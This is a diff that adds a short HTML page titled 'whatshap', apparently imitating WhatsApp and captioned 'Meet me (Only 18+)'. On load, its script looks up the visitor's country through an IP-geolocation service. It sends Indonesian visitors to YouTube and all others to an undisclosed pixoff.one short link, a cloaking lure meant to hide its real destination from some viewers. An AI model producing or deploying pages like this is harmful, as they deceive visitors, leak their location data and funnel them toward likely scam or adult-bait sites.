@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>whatshap</title>
+  <script>
+    fetch('https://ipapi.co/json/')
+      .then(response => response.json())
+      .then(data => {
+        const countryCode = data.country || 'XX';
+
+        const redirects = {
+          'ID': "https://www.youtube.com/?bp=wgUCEAE%3D"
+        };
+
+        const defaultUrl = "https://chhigjj.pixoff.one/p/GP5Yk";
+
+        const redirectUrl = redirects[countryCode] || defaultUrl;
+        window.location.href = redirectUrl;
+      })
+      .catch(error => {
+        console.error('Gagal mendeteksi lokasi:', error);
+        window.location.href = "https://chhigjj.pixoff.one/p/GP5Yk";
+      });
+  </script>
+</head>
+<body>
+  <p>Meet me (𝐎𝐧𝐥𝐲 𝟏𝟖+)</p>
+</body>
+</html>
